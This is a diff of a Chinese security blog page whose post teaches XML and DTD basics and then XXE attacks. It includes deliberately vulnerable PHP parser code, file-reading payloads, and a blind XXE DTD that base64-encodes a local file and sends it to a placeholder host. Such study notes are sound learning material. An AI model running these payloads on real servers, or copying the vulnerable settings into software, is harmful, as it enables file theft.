@@ -96,13 +96,21 @@
 
 
 
-  <meta property="og:type" content="website">
+  <meta name="description" content="[TOC] 本文只是对XXE漏洞学习，参考多篇文章 一、XML基础​    XML 用于编辑电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据，是一种允许用户的对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义、文档元素。 1234567&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;    &amp;lt;!--">
+<meta property="og:type" content="article">
 <meta property="og:title" content="0x516A&#39;Blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/02/17/XXE-漏洞学习/index.html">
 <meta property="og:site_name" content="0x516A&#39;Blog">
+<meta property="og:description" content="[TOC] 本文只是对XXE漏洞学习，参考多篇文章 一、XML基础​    XML 用于编辑电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据，是一种允许用户的对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义、文档元素。 1234567&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;    &amp;lt;!--">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/02/17/XXE-漏洞学习/XXE-漏洞学习/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/02/17/XXE-漏洞学习/XXE-漏洞学习/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/02/17/XXE-漏洞学习/XXE-漏洞学习/3.png">
+<meta property="og:updated_time" content="2019-02-17T09:50:53.583Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0x516A&#39;Blog">
+<meta name="twitter:description" content="[TOC] 本文只是对XXE漏洞学习，参考多篇文章 一、XML基础​    XML 用于编辑电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据，是一种允许用户的对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义、文档元素。 1234567&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;    &amp;lt;!--">
+<meta name="twitter:image" content="http://yoursite.com/2019/02/17/XXE-漏洞学习/XXE-漏洞学习/1.png">
 
 
 
@@ -111,7 +119,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/">
+  <link rel="canonical" href="http://yoursite.com/2019/02/17/XXE-漏洞学习/">
 
 
 
@@ -121,7 +129,7 @@
   };
 </script>
 
-  <title>0x516A'Blog</title>
+  <title> | 0x516A'Blog</title>
   
 
 
@@ -169,8 +177,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -208,7 +215,7 @@
         
         
           
-          <li class="menu-item menu-item-home menu-item-active">
+          <li class="menu-item menu-item-home">
 
     
     
@@ -350,9 +357,9 @@
           
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -385,9 +392,7 @@
         
         
           <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/17/XXE-漏洞学习/" class="post-title-link" itemprop="url">Untitled</a>
+
               
             
           </h1>
@@ -450,23 +455,53 @@
       
 
       
-        
-          <p>[TOC]</p>
+        <p>[TOC]</p>
 <p>本文只是对XXE漏洞学习，参考多篇文章</p>
 <h2 id="一、XML基础"><a href="#一、XML基础" class="headerlink" title="一、XML基础"></a>一、XML基础</h2><p>​    XML 用于编辑电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据，是一种允许用户的对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义、文档元素。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>    <span class="comment">&lt;!--xml声明 定义xml版本1.0和所使用的编码 ISO-8859-1--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>    <span class="comment">&lt;!--根元素--&gt;</span>    <span class="comment">&lt;!--之后为4个子元素(to,from,heading,body)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span>                </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span>John<span class="tag">&lt;/<span class="name">form</span>&gt;</span>        </span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>11111<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span>     <span class="comment">&lt;!--根元素结尾--&gt;</span></span><br></pre></td></tr></table></figure>
 <p>因为只为学习漏洞，不对xml进行详细学习。</p>
 <p><a href="http://www.w3school.com.cn/x.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/x.asp</a>可以在此查看详细内容</p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/02/17/XXE-漏洞学习/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
+<a id="more"></a>
+<p>而XXE漏洞相关的则为DTD</p>
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>​       DTD 文档类型定义，可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>​      DTD可以成行地声明XML文档中，也可以作为一个外部引用。<br><strong>1. 内部声明DTD</strong></p>
+<p>假如DTD 被包含在XML源文件中，应当通过下面的语法包装在一个DOCTYPE声明中</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素[元素声明]&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;    &lt;!--xml声明 定义xml版本1.0--&gt;</span><br><span class="line">&lt;!DOCTYPE note[					&lt;!--定义此文档为note类型的文档--&gt;</span><br><span class="line"> &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note 元素有4个元素 “to、from、heading、body--&gt;</span><br><span class="line"> &lt;!ELEMENT to    (#PCDATA)&gt;     &lt;!--定义to 元素为 “#PCDATA”类型 以下如此--&gt;</span><br><span class="line"> &lt;!ELEMENT from  (#PCDATA)&gt;</span><br><span class="line"> &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line"> &lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;1111&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>2. 引用外部</strong><br>假如DTD 位于XML源文件外部，那么应该通过下面的语言被封装在一个DOCTYOE定义中<br>       &lt;!DOCTYPE&gt; 根元素 SYSTEM “文件名”&gt;<br>与上 面内部声明 xml文件差不多，但是拥有一个外部的DTD<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>包含DTD的 note.dtd 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></p>
+<p><strong>3. 其中还有一种应用的格式为</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM <span class="string">"DTD文件"</span>[定义内容]&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="DTD-实体"><a href="#DTD-实体" class="headerlink" title="DTD -实体"></a>DTD -实体</h3><p> 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对(实体)的引用。(实体)可以在内部或者外部进行声明</p>
+<p><strong>1. 内部实体声明</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 “实体的值”&gt;</span><br></pre></td></tr></table></figure>
+<p>如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>注释:</strong> 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
+<p><strong>2. 一个外部实体声明</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSYTEM <span class="string">"URL"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
+<p>XML实体分为 普通实体和参数实体 。上面介绍的为普通实体 使用场合则为XML文档中</p>
+<p><img src="XXE-漏洞学习/1.png" alt=""></p>
+<h2 id="二、XML外部实体注入-XML-External-Entity-XEE"><a href="#二、XML外部实体注入-XML-External-Entity-XEE" class="headerlink" title="二、XML外部实体注入(XML External Entity XEE)"></a>二、XML外部实体注入(XML External Entity XEE)</h2><p>​       当允许引用外部实体时候，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口等危害。</p>
+<h3 id="有回显读取本地敏感文件"><a href="#有回显读取本地敏感文件" class="headerlink" title="有回显读取本地敏感文件"></a>有回显读取本地敏感文件</h3><h4 id="普通实体引用外部实体"><a href="#普通实体引用外部实体" class="headerlink" title="普通实体引用外部实体"></a>普通实体引用外部实体</h4><p>服务器 xml.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="XXE-漏洞学习/2.png" alt=""></p>
+<h4 id="参数实体引用外部实体"><a href="#参数实体引用外部实体" class="headerlink" title="参数实体引用外部实体"></a>参数实体引用外部实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE creds [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY  % a SYSTEM "192.168.11.57:8888/outdtd.dtd"&gt; %a;]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="无回显读取本地的敏感文件"><a href="#无回显读取本地的敏感文件" class="headerlink" title="无回显读取本地的敏感文件"></a>无回显读取本地的敏感文件</h3><p>​    可以看到在上面两个实验中，都是有显示，而另外一种情况无回显</p>
+<p>服务端 xml.php </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>1.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>Payload </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE convert [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://ip/test.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p> 在上面当中一直使用的为 file 协议 。在真实情况中应该清楚为什么平台，能够使用什么协议。</p>
+<p><img src="XXE-漏洞学习/3.png" alt=""></p>
+<h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>可以看出 XXE 漏洞，知识点涉及较多内容。如 其它利用 危害  Dos拒绝服务、内网主机探测 、内网主机端口扫描。 由于内容较多 之后在一一更新补充。</p>
+
       
     </div>
 
@@ -489,160 +524,28 @@
       
 
       
-
-      
-
       
       
-        <div class="post-eof"></div>
+
       
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/12/sqlmap总结/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="C'est La Vie">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="0x516A'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/01/12/sqlmap总结/" class="post-title-link" itemprop="url">sqlmap总结</a>
-              
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
+              <a href="/2019/01/12/sqlmap总结/" rel="next" title="sqlmap总结">
+                <i class="fa fa-chevron-left"></i> sqlmap总结
+              </a>
             
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-01-12 15:36:16 / Modified: 16:30:43" itemprop="dateCreated datePublished" datetime="2019-01-12T15:36:16+08:00">2019-01-12</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p> sqlmap是一个开源的渗透测试工具，可以用来自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有强度大的检测引擎，针对不同类型数据库的渗透测试的功能选项，包括获数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连击的方式执行操作系统命令</p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/01/12/sqlmap总结/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -652,163 +555,20 @@
   </article>
 
 
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/10/hello-world/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="C'est La Vie">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="0x516A'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/01/10/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-01-10 11:43:40 / Modified: 12:33:35" itemprop="dateCreated datePublished" datetime="2019-01-10T11:43:40+08:00">2019-01-10</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/01/10/hello-world/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
   </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
 
 
           </div>
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MTkyNC8xODQ3MA=="></div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -829,8 +589,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -922,6 +691,23 @@
         </div>
       </div>
 
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、XML基础"><span class="nav-number">1.</span> <span class="nav-text">一、XML基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DTD"><span class="nav-number">1.1.</span> <span class="nav-text">DTD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DTD-实体"><span class="nav-number">1.2.</span> <span class="nav-text">DTD -实体</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、XML外部实体注入-XML-External-Entity-XEE"><span class="nav-number">2.</span> <span class="nav-text">二、XML外部实体注入(XML External Entity XEE)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#有回显读取本地敏感文件"><span class="nav-number">2.1.</span> <span class="nav-text">有回显读取本地敏感文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#普通实体引用外部实体"><span class="nav-number">2.1.1.</span> <span class="nav-text">普通实体引用外部实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参数实体引用外部实体"><span class="nav-number">2.1.2.</span> <span class="nav-text">参数实体引用外部实体</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无回显读取本地的敏感文件"><span class="nav-number">2.2.</span> <span class="nav-text">无回显读取本地的敏感文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">2.3.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、总结"><span class="nav-number">3.</span> <span class="nav-text">三、总结</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
       
 
       
@@ -1058,6 +844,10 @@
 
 
   
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
 
   
 
@@ -1067,6 +857,23 @@
 
 
   
+  
+    <script>
+  window.livereOptions = {
+    refer: '2019/02/17/XXE-漏洞学习/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+  
+
 
 
 
